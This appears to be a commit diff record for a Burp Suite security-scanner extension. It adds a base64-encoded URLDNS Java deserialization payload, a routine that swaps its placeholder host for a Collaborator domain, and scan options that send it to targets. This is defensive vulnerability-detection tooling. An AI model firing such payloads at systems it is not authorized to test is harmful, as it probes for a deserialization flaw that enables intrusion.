{"hash": "e121cd8d93bf8f58584870f000c32cae73e3d8f4", "message": "Added URLDNS payload", "file_num_lines": 1536, "diff_parsed": {"added": [[80, "    private byte[] payloadURLDNS;"], [109, "    private JCheckBox enableActiveScanURLDNSChecks;"], [207, "    static final String TEST_DNS = \"DNS (vuln libraries)\";"], [208, "    static final String TEST_URLDNS = \"DNS (JRE only)\";"], [210, "    static final String[] TEST_TYPES = new String[]{TEST_SLEEP, TEST_DNS, TEST_URLDNS, TEST_CPU};"], [297, "        payloadURLDNS = Base64.decodeBase64(\"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QACFhYWFhYLml0dAAAcQB+AAV0AARodHRwcHh0AA9odHRwOi8vWFhYWFguaXR4\");"], [298, ""], [709, "                enableActiveScanDNSChecks = new JCheckBox(\"Enable active scan DNS checks (through vulnerable libraries)\");"], [715, "                enableActiveScanURLDNSChecks = new JCheckBox(\"Enable active scan DNS checks (URLDNS, Java JRE only)\");"], [716, "                enableActiveScanURLDNSChecks.setSelected(true);"], [717, "                enableActiveScanURLDNSChecks.setActionCommand(\"enableDisableActiveScanURLDNSChecks\");"], [718, "                enableActiveScanURLDNSChecks.addActionListener(BurpExtender.this);"], [719, "                enableActiveScanURLDNSChecks.setAlignmentX(Component.LEFT_ALIGNMENT);"], [720, ""], [768, "                mainPanelConfiguration.add(enableActiveScanURLDNSChecks);"], [1105, "\t\t\tHashMap<String,String> dnsCollaboratorUrls = new HashMap<String,String>();"], [1106, ""], [1107, "\t\t\t// URLDNS"], [1108, "\t\t\tif(enableActiveScanURLDNSChecks.isSelected()) {"], [1109, ""], [1110, "\t\t\t\tString urlDnsCollaboratorUrl = collaboratorContext.generatePayload(true);"], [1111, "\t\t\t\tbyte[] urldnsFinalPayload = createUrlDnsVector(payloadURLDNS,urlDnsCollaboratorUrl);"], [1112, "\t\t\t\tcurrentPayloads.put(\"URLDNS\", urldnsFinalPayload);"], [1113, "\t\t\t\tdnsCollaboratorUrls.put(\"URLDNS\", urlDnsCollaboratorUrl);"], [1114, ""], [1115, "\t\t\t}"], [1152, ""], [1251, "    \t\t\tHashMap<String,String> dnsCollaboratorUrls = new HashMap<String,String>();"], [1260, "    \t\t\t// URLDNS"], [1261, "    \t\t\tif(enableActiveScanURLDNSChecks.isSelected()) {"], [1262, ""], [1263, "    \t\t\t\tString urlDnsCollaboratorUrl = collaboratorContext.generatePayload(true);"], [1264, "    \t\t\t\tbyte[] urldnsFinalPayload = createUrlDnsVector(payloadURLDNS,urlDnsCollaboratorUrl);"], [1265, "    \t\t\t\tcurrentPayloads.put(\"URLDNS\", urldnsFinalPayload);"], [1266, "    \t\t\t\tdnsCollaboratorUrls.put(\"URLDNS\", urlDnsCollaboratorUrl);"], [1267, ""], [1268, "    \t\t\t}"], [1269, ""], [1270, "    \t\t\t// DNS"], [1536, "\t\t} else if(command.equals(\"enableDisableActiveScanSleepChecks\") || command.equals(\"enableDisableActiveScanDNSChecks\") || command.equals(\"enableDisableActiveScanURLDNSChecks\")) {"], [1671, "\t\tif(enableActiveScanSleepChecks.isSelected() || enableActiveScanDNSChecks.isSelected() || enableActiveScanURLDNSChecks.isSelected()) {"], [1875, "\t\t\tHashMap<String,String> dnsCollaboratorUrls = new HashMap<String,String>();"], [1892, ""], [1893, "\t\t\t} else if(testType.equals(BurpExtender.TEST_URLDNS)) {"], [1894, ""], [1895, "\t\t\t\tcurrentPayloads = new HashMap<String,byte[]>();"], [1896, ""], [1897, "\t\t\t\tString currentCollaboratorPayload = collaboratorContext.generatePayload(true);"], [1898, "    \t\t\tbyte[] dnsPayloadWithCollaboratorPayload = createUrlDnsVector(payloadURLDNS,currentCollaboratorPayload);"], [1899, "    \t\t\tcurrentPayloads.put(\"URLDNS\", dnsPayloadWithCollaboratorPayload);"], [1900, "    \t\t\tdnsCollaboratorUrls.put(\"URLDNS\", currentCollaboratorPayload);"], [1901, ""], [1902, "\t\t\t\tresultAreaManualTesting.setText(\"<p><b>SCANNING IN PROGRESS</b></p>\");"], [1907, ""], [1972, "        \t\tif(testType.equals(BurpExtender.TEST_DNS) || testType.equals(BurpExtender.TEST_URLDNS)) {"], [1998, "        \t\tif( ( ( testType.equals(BurpExtender.TEST_SLEEP) || testType.equals(BurpExtender.TEST_CPU) ) && (((int)duration) >= 10) ) || (( testType.equals(BurpExtender.TEST_DNS) || testType.equals(BurpExtender.TEST_URLDNS) ) && ( collaboratorInteractions.size() > 0 ) ) ) {"], [2112, ""], [2113, "\tpublic byte[] createUrlDnsVector(byte[] origVector, String collaboratorURL) {"], [2114, ""], [2115, "\t\tString firstValueToSearch = \"http://XXXXX.it\";"], [2116, "\t\tString collaboratorUrlFirst = \"http://\" + collaboratorURL;"], [2117, "\t\tint collaboratorFirstLength = collaboratorUrlFirst.length();"], [2118, ""], [2119, "\t\tint indexFirstCharacterFirstValueToSearch = helpers.indexOf(origVector, firstValueToSearch.getBytes(), true, 0, origVector.length);"], [2120, "\t\tint indexLastCharacterFirstValueToSearch = indexFirstCharacterFirstValueToSearch + firstValueToSearch.length() -1;"], [2121, "\t\tbyte[] preDNSVectorFirstValueToSearch = Arrays.copyOfRange(origVector, 0, indexFirstCharacterFirstValueToSearch);"], [2122, "\t\tbyte[] postDNSVectorFirstValueToSearch = Arrays.copyOfRange(origVector, indexLastCharacterFirstValueToSearch+1, origVector.length);"], [2123, "\t\tpreDNSVectorFirstValueToSearch[preDNSVectorFirstValueToSearch.length-1] = (byte)collaboratorFirstLength;"], [2124, "\t\tbyte[] tempVector = ArrayUtils.addAll(preDNSVectorFirstValueToSearch, collaboratorUrlFirst.getBytes());"], [2125, "\t\ttempVector = ArrayUtils.addAll(tempVector, postDNSVectorFirstValueToSearch);"], [2126, ""], [2127, "\t\t//0x08 (len) + XXXXX.it"], [2128, "\t\tbyte[] secondValueToSearch = {(byte)0x08,(byte)0x58,(byte)0x58,(byte)0x58,(byte)0x58,(byte)0x58,(byte)0x2e,(byte)0x69,(byte)0x74};"], [2129, "\t\tString collaboratorUrlSecond = collaboratorURL;"], [2130, "\t\tint collaboratorSecondLength = collaboratorURL.length();"], [2131, ""], [2132, "\t\tint indexFirstCharacterSecondValueToSearch = helpers.indexOf(tempVector, secondValueToSearch, true, 0, tempVector.length) + 1; //First researched char is length, the +1 skip to first char of the string"], [2133, "\t\tint indexLastCharacterSecondValueToSearch = indexFirstCharacterSecondValueToSearch + secondValueToSearch.length -2;"], [2134, "\t\tbyte[] preDNSVectorSecondValueToSearch = Arrays.copyOfRange(tempVector, 0, indexFirstCharacterSecondValueToSearch);"], [2135, "\t\tbyte[] postDNSVectorSecondValueToSearch = Arrays.copyOfRange(tempVector, indexLastCharacterSecondValueToSearch+1, tempVector.length);"], [2136, "\t\tpreDNSVectorSecondValueToSearch[preDNSVectorSecondValueToSearch.length-1] = (byte)collaboratorSecondLength;"], [2137, "\t\tbyte[] newVector = ArrayUtils.addAll(preDNSVectorSecondValueToSearch, collaboratorUrlSecond.getBytes());"], [2138, "\t\tnewVector = ArrayUtils.addAll(newVector, postDNSVectorSecondValueToSearch);"], [2139, ""], [2140, "\t\treturn newVector;"], [2141, ""], [2142, "\t}"]], "deleted": [[205, "    static final String TEST_DNS = \"DNS\";"], [207, "    static final String[] TEST_TYPES = new String[]{TEST_SLEEP, TEST_DNS, TEST_CPU};"], [704, "                enableActiveScanDNSChecks = new JCheckBox(\"Enable active scan DNS checks\");"], [1093, "\t\t\tHashMap<String,String> dnsCollaboratorUrls = null;"], [1103, ""], [1104, "\t\t\t\t//currentPayloads = new HashMap<String,byte[]>();"], [1105, "\t\t\t\tdnsCollaboratorUrls = new HashMap<String,String>();"], [1231, "    \t\t\tHashMap<String,String> dnsCollaboratorUrls = null;"], [1243, "    \t\t\t\tdnsCollaboratorUrls = new HashMap<String,String>();"], [1506, "\t\t} else if(command.equals(\"enableDisableActiveScanSleepChecks\") || command.equals(\"enableDisableActiveScanDNSChecks\")) {"], [1641, "\t\tif(enableActiveScanSleepChecks.isSelected() || enableActiveScanDNSChecks.isSelected()) {"], [1845, "\t\t\tHashMap<String,String> dnsCollaboratorUrls = null;"], [1866, "\t\t\t\tdnsCollaboratorUrls = new HashMap<String,String>();"], [1931, "        \t\tif(testType.equals(BurpExtender.TEST_DNS)) {"], [1957, "        \t\tif( ( ( testType.equals(BurpExtender.TEST_SLEEP) || testType.equals(BurpExtender.TEST_CPU) ) && (((int)duration) >= 10) ) || ( testType.equals(BurpExtender.TEST_DNS) && ( collaboratorInteractions.size() > 0 ) ) ) {"]]}, "num_lines_added": 87, "num_lines_removed": 15}